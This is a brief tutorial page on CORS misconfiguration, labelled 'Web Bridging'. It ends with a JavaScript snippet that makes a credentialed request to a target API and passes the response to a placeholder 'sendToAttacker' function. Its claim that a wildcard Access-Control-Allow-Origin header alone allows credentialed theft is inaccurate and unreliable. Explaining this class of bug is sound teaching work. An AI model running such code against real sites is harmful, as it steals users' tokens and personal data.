🔗 Web Bridging (Cross-Origin Exploitation)

"Web Bridging" (also known as CORS Misconfiguration) allows an attacker to access data from another website via a misconfigured server. This simulation shows how attackers misuse Cross-Origin Resource Sharing (CORS) policies.

1. What is Web Bridging?

It's when a vulnerable website allows requests from other domains without properly checking the origin, letting attackers steal sensitive data like tokens or personal information.

2. How Does It Happen?

  1. Server has misconfigured CORS headers (e.g., Access-Control-Allow-Origin: *)
  2. Attacker sends a malicious request via their website using JavaScript
  3. Victim's browser fetches sensitive data from vulnerable target and returns it to the attacker

3. Example Exploit (JS)

fetch('https://vulnerable.com/api/user', {
  credentials: 'include'
})
.then(res => res.text())
.then(data => sendToAttacker(data));
